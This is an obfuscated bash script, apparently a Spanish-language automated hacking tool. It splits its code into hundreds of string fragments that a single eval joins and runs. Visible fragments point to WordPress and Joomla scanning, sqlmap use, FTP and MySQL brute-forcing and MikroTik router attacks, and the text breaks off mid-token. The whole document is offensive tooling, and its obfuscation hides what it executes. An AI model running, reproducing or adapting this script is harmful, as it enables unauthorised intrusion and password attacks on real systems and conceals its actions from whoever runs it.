';cSz='_ins';bdz='rt S';vUz='tp_f';ZCz=' $OP';PRz='th/\';PPz='nner';AQz='rack';fjz='3=$?';Hfz='s/Mi';Skz='ftp ';yFz='on/*';JKz=''\''  #';tPz=' $pa';abz='mb >';PTz=' > u';ZUz='ue;r';hKz='re p';Tgz='sql ';OPz='/sca';rDz='EOF"';rz=' / _';CFz='e de';lhz=' `';aPz=' ENU';LPz='se a';nUz='rm u';Elz='ile';cVz=' url';Jgz='L ac';biz='p"_2';BJz='conf';uFz='fi';Mjz='NICA';mIz='no f';UQz='$use';jQz='ESSF';BFz='taqu';hLz='ort_';ARz='enti';cfz='utus';JQz='ckin';bSz='sWeb';Tnz='8 $i';qhz='redi';Jnz='x_in';bPz='MERA';Ykz='+] E';QZz=' ata';YTz='LE u';oEz='Dicc';SCz='e:d:';kbz='-t 1';UZz=' Pen';Kz='033[';wBz='.tor';Daz='="$l';dJz='solv';ROz='ss_l';jgz='a fu';lez='res"';Rgz='ysql';kNz='"bo"';faz=' *"4';tXz='uest';ajz='.ban';FOz=' " "';RHz='{';jIz='nos ';OIz='nexi';aRz='rdBD';PBz='/ | ';ljz='ebDa';TYz=' de ';Gjz='er|J';uiz='i -p';lgz='nand';ibz='orte';MEz='m/Da';iEz='nari';rCz='Y=$O';nQz=' | u';Ahz='ador';ekz='.res';gaz='43"*';QOz='dpre';Smz='ds2.';WZz='o ##';ULz='"';xRz='_"$p';ECz='N###';Aez='rt O';dSz='tanc';IVz=' use';cIz='onex';YFz='s ma';aEz='pres';xmz='ncra';pfz='y to';OQz='sPas';tZz=' *"h';wcz='-P t';kIz='módu';bcz='KSof';qBz='vers';Yjz='1=$?';chz='b-br';vz='__| ';cjz='2/"$';BEz='rio ';uVz='divi';WLz='line';qjz='Data';dYz='rtga';iz='   _';egz='et"*';DVz='er_p';Liz='x (S';Fbz='live';Eiz='ix.t';FUz='name';SJz='\t\r';cTz='E '\'''\''';slz='ds.t';nSz='odav';LOz='\"us';iHz='pty ';ijz='.enu';mLz='ut -';lUz='_joo';ZFz='s us';gQz='n ; ';fSz=' "$p';HOz=' "ms';oIz='onar';UJz='}|"`';aQz='t"  ';vhz='  > ';CGz='null';rkz=''\''s'\'' ';SBz='  ( ';wNz='];th';lfz='728_';vRz='ng/"';SUz=' RPO';fBz='|\__';fTz='AUTH';Thz='odb-';emz='d ho';obz=' sis';hZz='-a .';cz='echo';jKz='es d';vmz='o) #';fDz='ULL ';LZz='enta';CQz='"_wo';nhz='B] $';iez='es';QSz='(`ps';fYz='); d';ZLz='t se';vSz='brea';JBz='__) ';oWz='zar ';MCz='###$';uDz=' el ';ZQz=';exi';GJz='g et';HYz='co $';SLz='##$R';QJz='olv/';DIz='2>/d';ITz='t';kfz=' "" ';xGz='-pcA';Giz='rmix';nJz='/lan';fCz='OPTA';Wmz=' 5 m';Tdz='er S';vez='es" ';UTz='brut';OOz='ary/';ABz='   /';KMz='rt_p';Gdz='a -P';kTz='RPOR';Lfz='oTik';eSz='es"';vHz='Inte';Ckz='ra80';Plz='ulln';eiz='sh >';CEz='crea';eOz='MES ';kSz='" -g';AVz='ET u';gmz='3pw-';Sfz='us.p';xkz='ato:';
-eval "$Az$Bz$Cz$Dz$Ez$z$Fz$Gz$Hz$z$Iz$Jz$Kz$Lz$z$Mz$Nz$Oz$Pz$Qz$z$Rz$Sz$Tz$Uz$Vz$z$Wz$Xz$Yz$Ez$z$Zz$az$bz$z$cz$dz$ez$fz$gz$hz$hz$hz$iz$hz$hz$hz$hz$hz$hz$jz$kz$fz$lz$z$cz$dz$mz$fz$nz$hz$hz$hz$oz$pz$hz$hz$hz$hz$hz$qz$rz$gz$sz$z$cz$dz$tz$hz$iz$uz$fz$kz$vz$wz$xz$yz$uz$iz$ABz$BBz$CBz$DBz$sz$z$cz$dz$EBz$hz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$GBz$oz$CBz$NBz$OBz$PBz$sz$z$cz$dz$QBz$fz$RBz$SBz$TBz$UBz$vz$VBz$WBz$XBz$hz$YBz$ZBz$aBz$bBz$vz$sz$z$cz$dz$cBz$fz$dBz$YBz$eBz$fBz$gBz$hBz$iBz$dBz$hz$hz$jBz$kBz$lBz$mBz$lz$z$cz$nBz$z$cz$oBz$pBz$pBz$qBz$rBz$sBz$z$cz$oBz$pBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$z$cz$dz$CCz$DCz$ECz$FCz$FCz$FCz$FCz$FCz$FCz$FCz$FCz$GCz$HCz$ICz$JCz$KCz$LCz$FCz$FCz$FCz$FCz$FCz$FCz$FCz$FCz$FCz$MCz$Wz$NCz$z$OCz$PCz$QCz$RCz$SCz$TCz$UCz$VCz$WCz$z$XCz$z$YCz$ZCz$VCz$aCz$z$bCz$cCz$dCz$eCz$fCz$gCz$z$hCz$iCz$jCz$kCz$lCz$mCz$z$nCz$oCz$pCz$qCz$rCz$sCz$tCz$z$uCz$vCz$wCz$xCz$yCz$ADz$BDz$CDz$DDz$EDz$FDz$GDz$z$HDz$IDz$z$JDz$z$KDz$z$LDz$MDz$NDz$ODz$PDz$QDz$z$RDz$SDz$TDz$UDz$VCz$VDz$WDz$XDz$z$YDz$ZDz$aDz$WDz$XDz$z$bDz$cDz$LDz$dDz$eDz$fDz$gDz$hDz$iDz$jDz$kDz$lDz$mDz$nDz$oDz$z$pDz$qDz$rDz$z$sDz$tDz$uDz$vDz$wDz$xDz$yDz$AEz$BEz$CEz$DEz$EEz$FEz$GEz$HEz$IEz$JEz$KEz$LEz$MEz$vBz$NEz$OEz$PEz$QEz$REz$z$SEz$TEz$UEz$z$VEz$WEz$XEz$YEz$ZEz$aEz$bEz$cEz$dEz$eEz$fEz$gEz$hEz$iEz$jEz$kEz$lEz$mEz$z$nEz$oEz$pEz$BEz$qEz$rEz$sEz$tEz$uEz$vEz$pEz$wEz$z$xEz$yEz$AFz$BFz$CFz$DFz$EFz$FFz$GFz$kEz$lEz$HFz$IFz$JFz$KFz$LFz$MFz$NFz$OFz$PFz$QFz$RFz$SFz$TFz$UFz$VFz$WFz$XFz$YFz$ZFz$aFz$z$bFz$cFz$dFz$eFz$fFz$gFz$hFz$iFz$jFz$z$xEz$yEz$kFz$BFz$CFz$DFz$EFz$FFz$GFz$lFz$mFz$nFz$oFz$pFz$z$bFz$cFz$dFz$qFz$oFz$rFz$sFz$hFz$iFz$jFz$z$tFz$z$HDz$z$uFz$z$vFz$wFz$xFz$yFz$AGz$BGz$CGz$z$DGz$EGz$FGz$GGz$HGz$IGz$JGz$KGz$LGz$z$bDz$MGz$iDz$jDz$eDz$fDz$NGz$OGz$z$cz$PGz$ODz$QGz$RGz$SGz$z$WFz$TGz$dFz$UGz$VGz$WGz$XGz$YGz$ZGz$aGz$bGz$z$cGz$dGz$bGz$z$eGz$z$fGz$RDz$SDz$gGz$hGz$iGz$z$uFz$z$cz$jGz$kGz$lGz$mGz$aGz$bGz$z$cz$nGz$oGz$pGz$qGz$SGz$z$cz$rGz$sGz$pGz$qGz$SGz$z$tGz$uGz$vGz$aFz$wGz$xGz$yGz$AHz$BHz$CHz$DHz$EHz$FHz$GHz$z$DGz$HHz$IHz$JHz$KHz$z$LHz$MHz$NHz$OHz$PHz$QHz$RHz$z$SHz$THz$UHz$VHz$WHz$XHz$YHz$ZHz$aHz$bHz$cHz$dHz$eHz$AGz$BGz$CGz$fHz$gHz$hHz$iHz$jHz$kHz$z$lHz$mHz$nHz$oHz$z$pHz$EGz$FGz$GGz$HGz$qHz$EGz$FGz$GGz$HGz$rHz$EHz$FHz$GHz$z$sHz$z$tHz$uHz$vHz$wHz$xHz$yHz$AIz$BIz$CIz$DIz$EIz$FIz$GIz$HIz$IIz$JIz$KIz$LIz$MIz$z$bDz$NIz$OIz$PIz$QIz$RIz$SIz$TIz$UIz$z$cz$dz$VIz$WIz$XIz$YIz$ZIz$aIz$bIz$cIz$rBz$dIz$eIz$fIz$gIz$hIz$iIz$jIz$kIz$lIz$mIz$nIz$oIz$pIz$qIz$rIz$sIz$tIz$uIz$z$eGz$z$vIz$wIz$pDz$xIz$yIz$AJz$BJz$CJz$z$DJz$EJz$FJz$GJz$HJz$IJz$JJz$KJz$LJz$MJz$NJz$CJz$z$vIz$wIz$cz$OJz$PJz$QJz$RJz$SJz$TJz$UJz$z$VJz$WJz$CJz$z$XJz$YJz$ZJz$aJz$bJz$cJz$dJz$eJz$dJz$fJz$gJz$hJz$iJz$jJz$kJz$lJz$mJz$nJz$oJz$pJz$qJz$rJz$sJz$DIz$EIz$FIz$tJz$z$uJz$vJz$wJz$xJz$yJz$AKz$BKz$CKz$DKz$EKz$FKz$AGz$BGz$CGz$GKz$z$uFz$z$HKz$IKz$JKz$KKz$LKz$MKz$NKz$OKz$PKz$QKz$RKz$SKz$z$bDz$TKz$UKz$VKz$WKz$XKz$YKz$sFz$ZKz$z$OGz$z$bDz$aKz$bKz$eDz$fDz$NGz$OGz$z$cz$dz$cKz$dKz$eKz$fKz$gKz$hKz$iKz$jKz$kKz$lKz$mKz$EFz$nKz$oKz$pKz$qKz$rKz$sKz$BFz$CFz$kEz$lEz$tKz$uKz$tIz$uIz$z$vKz$wKz$xKz$yKz$z$uFz$z$bDz$ALz$BLz$CLz$iFz$DLz$ELz$FLz$GLz$HLz$ILz$JLz$KLz$TIz$UIz$z$cz$dz$CCz$LLz$MLz$FCz$FCz$FCz$FCz$FCz$NLz$OLz$kEz$PLz$QLz$RLz$FCz$FCz$FCz$FCz$FCz$SLz$TLz$ULz$z$VLz$WLz$XLz$YLz$ZLz$aLz$bLz$cLz$dLz$eLz$fLz$XCz$z$gLz$hLz$iLz$jLz$kLz$WLz$lLz$mLz$nLz$oLz$pLz$z$qLz$rLz$sLz$tLz$uLz$vLz$wLz$xLz$yLz$TKz$AMz$z$cz$dz$cKz$BMz$FCz$FCz$CMz$DMz$EMz$FMz$FCz$GMz$z$gLz$HMz$tLz$IMz$JMz$KMz$LMz$wLz$xLz$MMz$TKz$NMz$OMz$PMz$QMz$RMz$SMz$z$TMz$cz$CMz$DMz$UMz$VMz$WMz$XMz$YMz$z$ZMz$jLz$kLz$gLz$aMz$wLz$xLz$bMz$TKz$AMz$z$iLz$jLz$kLz$gLz$hLz$iLz$lLz$mLz$cMz$oLz$dMz$z$cz$eMz$z$bDz$fMz$gMz$hMz$iMz$jMz$kMz$lMz$mMz$TIz$UIz$z$cz$dz$nMz$oMz$kMz$lMz$pMz$qMz$rMz$sMz$z$cz$dz$nMz$tMz$uMz$vMz$gKz$wMz$xMz$yMz$ANz$BNz$ULz$z$bDz$TKz$CNz$UHz$VHz$WHz$DNz$ENz$FNz$ZMz$GNz$HNz$INz$JNz$KNz$LNz$z$VLz$HNz$XLz$YLz$MNz$NNz$ONz$PNz$QNz$RNz$SNz$TNz$UNz$VNz$WNz$XNz$YNz$z$cz$dz$ZNz$aNz$bNz$cNz$dNz$eNz$fNz$gNz$hNz$z$bDz$cDz$iNz$jNz$kNz$lNz$mNz$nNz$oNz$pNz$qNz$rNz$iNz$jNz$sNz$tNz$rNz$iNz$uNz$vNz$tNz$rNz$iNz$uNz$sNz$mMz$wNz$LNz$z$xNz$yNz$AOz$BOz$COz$DOz$EOz$wLz$xLz$FOz$GOz$CJz$z$cz$HOz$IOz$JOz$KOz$LOz$MOz$NOz$OOz$oJz$pJz$iJz$POz$QOz$ROz$SOz$TOz$UOz$VOz$WOz$XOz$aGz$YOz$ZOz$aOz$bOz$cOz$dOz$eOz$fOz$gOz$hOz$iOz$jOz$kOz$lOz$mOz$nOz$oOz$pOz$qOz$rOz$sOz$tOz$uOz$vOz$wOz$xOz$yOz$APz$BPz$CPz$DPz$EPz$bFz$FPz$RNz$SNz$TNz$UNz$kMz$lMz$GPz$SGz$AGz$BGz$CGz$z$HPz$IPz$JPz$KPz$LPz$MPz$NPz$OPz$PPz$QPz$RPz$kGz$SPz$TPz$UPz$VPz$WPz$XPz$YPz$qGz$SGz$ZPz$aPz$bPz$cPz$dPz$ePz$fPz$gPz$hPz$iPz$jPz$kPz$lPz$mPz$CMz$tOz$nPz$dOz$oPz$HNz$pPz$qPz$rPz$sPz$tPz$uPz$vPz$HDz$wPz$xPz$yPz$AQz$BQz$ENz$FNz$ZMz$CQz$kGz$DQz$EQz$sFz$DIz$EIz$FQz$z$eGz$z$cz$HOz$IOz$JOz$KOz$LOz$MOz$NOz$OOz$oJz$pJz$iJz$POz$QOz$ROz$SOz$TOz$UOz$VOz$WOz$XOz$aGz$YOz$ZOz$aOz$bOz$cOz$dOz$eOz$fOz$gOz$hOz$CMz$tOz$nPz$dOz$oPz$HNz$pPz$qPz$rPz$sPz$tPz$uPz$vPz$HDz$GQz$mGz$HQz$IQz$JQz$KQz$LQz$MQz$NQz$XFz$aEz$OQz$INz$PQz$EHz$FHz$GHz$z$HPz$IPz$JPz$KPz$LPz$MPz$NPz$OPz$PPz$QPz$RPz$kGz$SPz$TPz$UPz$VPz$WPz$XPz$YPz$qGz$SGz$ZPz$aPz$bPz$cPz$dPz$ePz$fPz$gPz$hPz$QQz$RQz$SQz$dPz$TQz$UQz$VQz$ZOz$EDz$WQz$XQz$LMz$YQz$ZQz$aQz$DPz$EPz$bFz$FPz$RNz$SNz$TNz$UNz$kMz$lMz$GPz$SGz$AGz$BGz$CGz$z$uFz$z$KDz$z$eGz$z$cz$dz$ZNz$aNz$bNz$cNz$dNz$eNz$fNz$bQz$cQz$z$bDz$cDz$iNz$jNz$kNz$lNz$mNz$nNz$oNz$pNz$qNz$rNz$iNz$jNz$sNz$tNz$rNz$iNz$uNz$vNz$tNz$rNz$iNz$uNz$sNz$mMz$wNz$LNz$z$xNz$yNz$AOz$BOz$COz$DOz$EOz$wLz$xLz$FOz$GOz$CJz$z$cz$HOz$IOz$JOz$KOz$LOz$MOz$NOz$OOz$oJz$pJz$iJz$POz$QOz$ROz$SOz$TOz$UOz$VOz$WOz$XOz$aGz$YOz$ZOz$aOz$bOz$cOz$dOz$eOz$fOz$gOz$hOz$iOz$jOz$kOz$lOz$mOz$nOz$oOz$pOz$qOz$dQz$RLz$tOz$uOz$vOz$wOz$xOz$yOz$APz$BPz$CPz$DPz$EPz$bFz$FPz$RNz$SNz$TNz$UNz$kMz$lMz$GPz$SGz$AGz$BGz$CGz$z$HPz$IPz$JPz$KPz$LPz$MPz$NPz$OPz$PPz$QPz$RPz$kGz$SPz$TPz$UPz$VPz$WPz$XPz$YPz$qGz$SGz$ZPz$aPz$bPz$cPz$dPz$ePz$fPz$gPz$hPz$iPz$jPz$kPz$lPz$mPz$CMz$tOz$nPz$dOz$eQz$fQz$pPz$qPz$rPz$sPz$tPz$uPz$vPz$HDz$wPz$xPz$yPz$AQz$BQz$ENz$FNz$ZMz$CQz$kGz$DQz$EQz$sFz$DIz$EIz$FQz$z$eGz$z$cz$HOz$IOz$JOz$KOz$LOz$MOz$NOz$OOz$oJz$pJz$iJz$POz$QOz$ROz$SOz$TOz$UOz$VOz$WOz$XOz$aGz$YOz$ZOz$aOz$bOz$cOz$dOz$eOz$fOz$gOz$hOz$CMz$tOz$nPz$dOz$eQz$fQz$pPz$qPz$rPz$sPz$tPz$uPz$vPz$HDz$GQz$mGz$HQz$IQz$JQz$KQz$LQz$MQz$NQz$XFz$aEz$OQz$INz$PQz$EHz$FHz$GHz$z$HPz$IPz$JPz$KPz$LPz$MPz$NPz$OPz$PPz$QPz$RPz$kGz$SPz$TPz$UPz$VPz$WPz$XPz$YPz$qGz$SGz$ZPz$aPz$bPz$cPz$dPz$ePz$fPz$gPz$hPz$QQz$RQz$SQz$dPz$TQz$cLz$gQz$ZOz$EDz$WQz$XQz$LMz$YQz$ZQz$aQz$DPz$EPz$bFz$FPz$RNz$SNz$TNz$UNz$kMz$lMz$GPz$SGz$AGz$BGz$CGz$z$uFz$z$uFz$z$IJz$JJz$KJz$LJz$hQz$iQz$jQz$kQz$HQz$IQz$JQz$KQz$LQz$MQz$NQz$XFz$aEz$OQz$INz$PQz$EHz$FHz$lQz$mQz$nQz$oQz$pQz$NNz$ONz$PNz$qQz$ENz$FNz$ZMz$CQz$kGz$DQz$EQz$bGz$z$uFz$z$bDz$fMz$gMz$hMz$iMz$rQz$sQz$cLz$tQz$uQz$OGz$z$cz$dz$nMz$vQz$wQz$xQz$yQz$ARz$BRz$CRz$z$cz$DRz$ERz$FRz$GRz$HRz$IRz$ZMz$JRz$KRz$LRz$MRz$NRz$ORz$PRz$QRz$RRz$SRz$TRz$XFz$aEz$URz$oGz$VRz$WRz$XRz$hGz$YRz$xPz$yPz$AQz$BQz$ENz$FNz$ZMz$ZRz$oFz$aRz$SGz$z$WFz$bRz$cRz$BOz$dRz$eRz$fRz$gRz$hRz$fQz$iRz$jRz$kRz$QRz$RRz$lRz$qGz$SGz$mGz$HQz$IQz$JQz$KQz$LQz$MQz$NQz$WFz$XFz$mRz$nRz$z$WFz$bRz$cRz$BOz$dRz$eRz$fRz$gRz$hRz$fQz$iRz$jRz$kRz$QRz$oRz$MRz$pRz$qRz$rRz$sRz$tRz$uRz$vRz$wRz$xRz$yRz$ASz$lEz$BSz$sFz$tJz$z$WFz$bRz$cRz$BOz$dRz$eRz$fRz$gRz$hRz$fQz$iRz$jRz$kRz$QRz$CSz$QOz$DSz$pRz$qRz$rRz$sRz$tRz$uRz$vRz$wRz$xRz$yRz$ASz$lEz$BSz$sFz$tJz$z$WFz$bRz$cRz$BOz$dRz$eRz$fRz$gRz$hRz$fQz$iRz$jRz$kRz$QRz$ESz$FSz$XRz$hGz$GSz$xPz$yPz$AQz$BQz$ENz$FNz$ZMz$ZRz$oFz$aRz$SGz$GKz$z$WFz$bRz$cRz$BOz$dRz$eRz$fRz$gRz$hRz$fQz$iRz$jRz$kRz$QRz$HSz$WRz$XRz$hGz$GSz$xPz$yPz$AQz$BQz$ENz$FNz$ZMz$ZRz$oFz$aRz$SGz$GKz$z$ISz$JSz$z$OCz$KSz$LSz$XCz$z$WFz$MSz$NSz$OSz$PSz$QSz$RSz$SSz$TSz$WFz$USz$LIz$MIz$VSz$WSz$z$cz$DRz$ERz$XSz$YSz$ZSz$aSz$bSz$cSz$dSz$eSz$z$bDz$fSz$gSz$hSz$iSz$jSz$kSz$lSz$ZKz$z$OGz$z$cz$dz$nMz$mSz$nSz$oSz$pSz$oJz$qSz$qEz$gSz$rSz$sSz$LFz$aSz$bSz$cSz$dSz$tSz$z$ISz$uSz$z$eGz$z$vSz$wSz$z$uFz$z$KDz$z$IJz$JJz$KJz$LJz$hQz$xSz$ySz$ATz$HQz$IQz$JQz$KQz$LQz$MQz$NQz$WFz$XFz$mRz$BTz$CTz$UMz$DTz$ETz$EGz$FGz$GGz$HGz$RNz$SNz$TNz$FTz$rEz$GTz$HTz$ITz$z$uFz$z$bDz$fMz$gMz$hMz$iMz$JTz$KTz$LTz$uQz$OGz$z$cz$dz$nMz$MTz$KTz$NTz$ARz$BRz$CRz$z$cz$dz$nMz$tMz$uMz$vMz$gKz$wMz$xMz$yMz$ANz$BNz$ULz$z$cz$OTz$cQz$PTz$QTz$RTz$bGz$z$cz$HOz$IOz$JOz$KOz$LOz$MOz$NOz$OOz$oJz$pJz$iJz$STz$TTz$UTz$VTz$WTz$SOz$ZPz$pOz$XTz$YTz$QTz$RTz$YOz$ZOz$ZTz$aTz$bTz$cTz$ZPz$dTz$eTz$nOz$ZOz$fTz$gTz$hTz$kRz$iTz$jTz$kOz$VOz$WOz$XOz$aGz$YOz$ZOz$kTz$lTz$mTz$oOz$pOz$qOz$dQz$nTz$oOz$oTz$pTz$qTz$rTz$sTz$tTz$uTz$vTz$wTz$HQz$IQz$JQz$KQz$LQz$MQz$NQz$xTz$yTz$iGz$z$HPz$IPz$JPz$KPz$LPz$MPz$NPz$OPz$PPz$QPz$AUz$oGz$BUz$xKz$CUz$TPz$DUz$nPz$EUz$XOz$HNz$FUz$SGz$ZPz$pOz$GUz$HUz$IUz$JUz$KUz$LUz$CMz$ZPz$MUz$NUz$OUz$iLz$PUz$QUz$RUz$WPz$XPz$YPz$qGz$SGz$ZPz$SUz$TUz$ZMz$tOz$nPz$dOz$eQz$fQz$tOz$UUz$VUz$WUz$XUz$YUz$ZUz$APz$aUz$mGz$HQz$IQz$JQz$KQz$LQz$MQz$NQz$xTz$yTz$bUz$JGz$KGz$LGz$z$IJz$JJz$KJz$LJz$hQz$cUz$dUz$eUz$SOz$fUz$yPz$AQz$BQz$ENz$FNz$ZMz$gUz$oGz$SGz$hUz$aMz$iUz$jUz$THz$UHz$VHz$WHz$kUz$wRz$xRz$yRz$lUz$mUz$bGz$z$nUz$QTz$RTz$bGz$z$uFz$z$bDz$fMz$gMz$hMz$iMz$oUz$pUz$qUz$uQz$OGz$z$cz$dz$nMz$rUz$pUz$sUz$ARz$BRz$CRz$z$cz$DRz$tUz$uUz$vUz$wUz$xUz$yUz$AVz$BVz$gLz$hLz$iLz$CVz$DVz$EVz$FVz$GVz$pUz$HVz$IVz$JVz$KVz$LVz$MVz$NVz$OVz$xPz$yPz$AQz$BQz$ENz$FNz$ZMz$ZRz$oFz$PVz$QVz$RVz$sFz$SVz$HQz$IQz$JQz$KQz$LQz$MQz$NQz$WFz$XFz$TVz$UVz$VVz$ITz$z$WVz$XVz$iJz$YVz$ZVz$aVz$bVz$cVz$dVz$DMz$EMz$eVz$HNz$ASz$fVz$gVz$hVz$pDz$iVz$jVz$WFz$kVz$lVz$mVz$nVz$mGz$HQz$IQz$JQz$KQz$LQz$MQz$NQz$WFz$XFz$TVz$UVz$VVz$PQz$xPz$yPz$AQz$BQz$ENz$FNz$ZMz$ZRz$oFz$PVz$QVz$RVz$bGz$z$oVz$pVz$qVz$rVz$sVz$EPz$bFz$FPz$RNz$SNz$TNz$FTz$rEz$tVz$uVz$vVz$SGz$z$IJz$wVz$xVz$z$bDz$yVz$AWz$BWz$CWz$DWz$EWz$oDz$z$cz$dz$nMz$FWz$rEz$GWz$xSz$ySz$CRz$z$cz$HWz$pUz$IWz$gLz$hLz$iLz$JWz$fNz$KWz$gVz$LWz$lEz$MWz$gVz$NWz$THz$UHz$VHz$WHz$kUz$wRz$xRz$yRz$ASz$lEz$OWz$PWz$QWz$iGz$z$uFz$z$cz$DRz$tUz$uUz$vUz$wUz$xUz$yUz$AVz$BVz$gLz$hLz$iLz$CVz$DVz$EVz$RWz$SWz$HVz$IVz$JVz$KVz$LVz$MVz$NVz$OVz$xPz$yPz$AQz$BQz$ENz$FNz$ZMz$ZRz$oFz$PVz$QVz$RVz$sFz$SVz$HQz$IQz$JQz$KQz$LQz$MQz$NQz$WFz$XFz$TVz$UVz$VVz$ITz$z$WVz$XVz$iJz$YVz$ZVz$aVz$bVz$cVz$dVz$DMz$EMz$eVz$HNz$ASz$TWz$UWz$VWz$iVz$jVz$WFz$kVz$lVz$mVz$nVz$mGz$HQz$IQz$JQz$KQz$LQz$MQz$NQz$WFz$XFz$TVz$UVz$VVz$PQz$xPz$yPz$AQz$BQz$ENz$FNz$ZMz$ZRz$oFz$PVz$QVz$RVz$bGz$z$oVz$pVz$qVz$rVz$sVz$EPz$bFz$FPz$RNz$SNz$TNz$FTz$rEz$tVz$uVz$vVz$SGz$z$IJz$wVz$xVz$z$bDz$yVz$AWz$BWz$CWz$DWz$EWz$oDz$z$cz$dz$nMz$FWz$rEz$GWz$xSz$ySz$CRz$z$cz$HWz$pUz$IWz$gLz$hLz$iLz$JWz$fNz$WWz$XWz$rEz$YWz$RWz$NWz$pQz$NNz$ONz$PNz$qQz$ENz$FNz$ZMz$ZRz$oFz$PVz$QVz$RVz$bGz$z$uFz$z$uFz$z$KDz$z$lHz$ZWz$aWz$z$uFz$z$uFz$z$bDz$TKz$UKz$VKz$bWz$cWz$dWz$eWz$z$OGz$z$bDz$aKz$bKz$eDz$fDz$NGz$OGz$z$cz$dz$cKz$dKz$eKz$fKz$gKz$fWz$gWz$hWz$iWz$jWz$kWz$lWz$mWz$nWz$oWz$pWz$qWz$nFz$oFz$rWz$sWz$tWz$TLz$ULz$z$vKz$wKz$xKz$yKz$z$uFz$z$bDz$ALz$BLz$CLz$iFz$DLz$ELz$FLz$GLz$HLz$ILz$JLz$KLz$TIz$UIz$z$uWz$vWz$wWz$xWz$yWz$hGz$AXz$BXz$pEz$CXz$oFz$DXz$EXz$z$cz$dz$CCz$LLz$MLz$FCz$FCz$FCz$FCz$FCz$NLz$OLz$kEz$FXz$GXz$FCz$FCz$FCz$FCz$FCz$SLz$TLz$ULz$z$VLz$HXz$IXz$pDz$UKz$VKz$bWz$cWz$dWz$XNz$YNz$z$oVz$pVz$JXz$KXz$LXz$MXz$NXz$OXz$ENz$PXz$QXz$RXz$z$IJz$wVz$xVz$z$bDz$yVz$AWz$BWz$CWz$DWz$EWz$oDz$z$cz$dz$SXz$bNz$cNz$IMz$TXz$z$cz$DRz$tUz$uUz$vUz$wUz$xUz$yUz$AVz$UXz$VXz$WXz$XXz$YXz$jVz$WFz$ZXz$aXz$bXz$cXz$hGz$WGz$dXz$DVz$eXz$fXz$gXz$vKz$hXz$mGz$HQz$IQz$JQz$KQz$LQz$iXz$rEz$tVz$uVz$vVz$SGz$jXz$sRz$tRz$uRz$vRz$wRz$kXz$WFz$XFz$TVz$UVz$VVz$ITz$z$WVz$XVz$iJz$YVz$ZVz$aVz$bVz$cVz$lXz$mXz$nXz$oXz$jVz$WFz$ZXz$aXz$bXz$cXz$hGz$WGz$dXz$DVz$eXz$fXz$gXz$vKz$pXz$DPz$EPz$bFz$FPz$RNz$qXz$rXz$oFz$PVz$QVz$RVz$sFz$SVz$HQz$IQz$JQz$KQz$LQz$iXz$rEz$tVz$uVz$vVz$SGz$z$sXz$tXz$uXz$TSz$vXz$wXz$xXz$yXz$rVz$AYz$EPz$bFz$FPz$RNz$qXz$rXz$oFz$PVz$QVz$RVz$BYz$z$IJz$wVz$xVz$z$bDz$yVz$AWz$BWz$CWz$DWz$EWz$oDz$z$cz$CYz$DYz$EYz$FYz$FFz$GYz$HYz$sXz$tXz$IYz$pQz$NNz$ONz$PNz$qQz$ENz$JYz$ASz$lEz$OWz$PWz$QWz$iGz$z$uFz$z$uFz$z$KDz$z$lHz$ZWz$aWz$z$uFz$z$uFz$z$bDz$TKz$UKz$VKz$KYz$LYz$eWz$z$OGz$z$bDz$aKz$bKz$eDz$fDz$NGz$OGz$z$cz$dz$cKz$dKz$eKz$fKz$gKz$MYz$NYz$gIz$OYz$PYz$QYz$RYz$SYz$TYz$WFz$XFz$UYz$VYz$WYz$XYz$z$vKz$wKz$xKz$yKz$z$uFz$z$bDz$ALz$BLz$CLz$iFz$DLz$ELz$FLz$GLz$HLz$ILz$JLz$KLz$TIz$UIz$z$cz$dz$CCz$LLz$MLz$FCz$FCz$FCz$FCz$FCz$NLz$OLz$YYz$ZYz$FCz$FCz$FCz$FCz$FCz$WYz$XYz$z$uWz$vWz$wWz$aYz$cLz$bYz$hGz$AXz$BXz$pEz$CXz$oFz$cYz$dYz$fQz$z$VLz$WLz$XLz$YLz$ZLz$aLz$bLz$eYz$SGz$fYz$gYz$z$TMz$cz$hYz$iYz$jYz$kYz$lYz$mYz$z$ZMz$jLz$kLz$WLz$lLz$mLz$nYz$oYz$CJz$z$cz$dz$SXz$bNz$cNz$IMz$pYz$yRz$z$cz$DRz$ERz$FRz$GRz$HRz$IRz$ZMz$iRz$qYz$YYz$rYz$sYz$tYz$MRz$pRz$qRz$uYz$sRz$tRz$uRz$vRz$wRz$xRz$yRz$ASz$lEz$OWz$PWz$QWz$iGz$z$WFz$bRz$cRz$BOz$dRz$eRz$fRz$vYz$wYz$NYz$xYz$dYz$fQz$TKz$aGz$sFz$DPz$EPz$bFz$FPz$RNz$SNz$TNz$FTz$rEz$tVz$uVz$vVz$SGz$z$IJz$JJz$KJz$LJz$hQz$xSz$ySz$ATz$HQz$IQz$JQz$KQz$LQz$MQz$NQz$WFz$XFz$TVz$UVz$VVz$yYz$AZz$fEz$BZz$CZz$DZz$LQz$MQz$NQz$WFz$XFz$TVz$UVz$VVz$ITz$z$cz$eMz$z$KDz$z$lHz$ZWz$aWz$z$uFz$z$uFz$z$bDz$TKz$UKz$VKz$EZz$FZz$VVz$GZz$z$OGz$z$bDz$aKz$bKz$eDz$fDz$NGz$OGz$z$cz$dz$cKz$dKz$eKz$fKz$gKz$HZz$IZz$JZz$KZz$LZz$MZz$sSz$NZz$OZz$PZz$QZz$RZz$qEz$rEz$sEz$SZz$TZz$Wz$NCz$z$vKz$wKz$xKz$yKz$z$uFz$z$bDz$ALz$BLz$CLz$iFz$DLz$ELz$FLz$GLz$HLz$ILz$JLz$KLz$TIz$UIz$z$cz$dz$CCz$LLz$MLz$FCz$FCz$FCz$FCz$FCz$NLz$OLz$UZz$VZz$WZz$FCz$FCz$FCz$FCz$FCz$WYz$XYz$z$VLz$WLz$XLz$YLz$ZLz$aLz$bLz$XZz$YZz$ZZz$aZz$z$TMz$cz$hYz$iYz$jYz$kYz$lYz$mYz$z$ZMz$jLz$kLz$WLz$lLz$mLz$nYz$oYz$CJz$z$cz$dz$SXz$bNz$cNz$IMz$TXz$z$WFz$bRz$cRz$BOz$dRz$eRz$fRz$vYz$bZz$LZz$cZz$dZz$RLz$XRz$hGz$eZz$xPz$yPz$AQz$BQz$ENz$FNz$ZMz$ZRz$oFz$PVz$QVz$RVz$bGz$z$ISz$fZz$z$IJz$JJz$KJz$LJz$hQz$xSz$ySz$ATz$HQz$IQz$JQz$KQz$LQz$MQz$NQz$WFz$XFz$TVz$UVz$VVz$UMz$gZz$hZz$EGz$FGz$GGz$HGz$RNz$SNz$TNz$FTz$rEz$tVz$uVz$vVz$SGz$z$cz$eMz$z$KDz$z$lHz$ZW